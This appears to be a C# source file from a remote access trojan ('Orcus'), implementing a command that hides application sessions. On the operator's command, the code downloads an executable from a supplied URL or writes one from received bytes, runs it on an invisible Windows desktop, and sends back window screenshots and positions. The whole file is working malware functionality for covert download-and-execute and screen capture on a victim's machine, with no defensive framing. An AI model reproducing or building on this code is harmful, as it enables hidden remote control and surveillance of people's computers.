using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.HiddenApplication;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.HiddenApplication
{
    public class HiddenApplicationCommand : Command
    {
        private Desktop _currentDesktop;
        private Process _currentProcess;

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            var command = (HiddenApplicationCommunication) parameter[0];
            switch (command)
            {
                case HiddenApplicationCommunication.StartSessionFromFile:
                case HiddenApplicationCommunication.StartSessionFromUrl:
                    if (_currentDesktop?.IsOpen == true)
                    {
                        ResponseByte((byte) HiddenApplicationCommunication.FailedSessionAlreadyStarted, connectionInfo);
                        return;
                    }

                    var file = FileExtensions.GetFreeTempFileName("exe");
                    if (command == HiddenApplicationCommunication.StartSessionFromUrl)
                        new WebClient().DownloadFile(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1), file);
                    else
                        using (var fileStream = new FileStream(file, FileMode.CreateNew, FileAccess.Write))
                            fileStream.Write(parameter, 1, parameter.Length - 1);

                    _currentDesktop = new Desktop();
                    _currentDesktop.Create(Guid.NewGuid().ToString());
                    _currentProcess = _currentDesktop.CreateProcess(file, "");
                    if (_currentProcess == null)
                    {
                        _currentDesktop.Dispose();
                        ResponseByte((byte) HiddenApplicationCommunication.FailedProcessDidntStart, connectionInfo);
                        return;
                    }

                    ResponseByte((byte) HiddenApplicationCommunication.SessionStartedSuccessfully, connectionInfo);
                    break;
                case HiddenApplicationCommunication.GetPackage:
                    Desktop.SetCurrent(_currentDesktop);
                    var handle = BitConverter.ToInt64(parameter, 1);

                    var result = new WindowPackage {Windows = new List<ApplicationWindow>()};
                    var windows = _currentDesktop.GetWindows();
                    for (int i = 0; i < windows.Count; i++)
                    {
                        var window = windows[i];
                        RECT rect;
                        NativeMethods.GetWindowRect(window.Handle, out rect);
                        result.Windows.Add(new ApplicationWindow
                        {
                            Height = rect.Height,
                            Width = rect.Width,
                            X = rect.X,
                            Y = rect.Y,
                            Handle = (long) window.Handle
                        });

                        if (window.Handle == (IntPtr) handle)
                        {
                            using (var memoryStream = new MemoryStream())
                            using (var bitmap = _currentDesktop.DrawWindow(window.Handle, rect))
                            {
                                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                                result.WindowData = memoryStream.ToArray();
                                result.WindowHandle = handle;
                            }
                        }
                    }

                    ResponseBytes((byte) HiddenApplicationCommunication.ResponsePackage,
                        new Serializer(typeof (WindowPackage)).Serialize(result), connectionInfo);
                    break;
            }
        }

        protected override uint GetId()
        {
            return 26;
        }
    }
}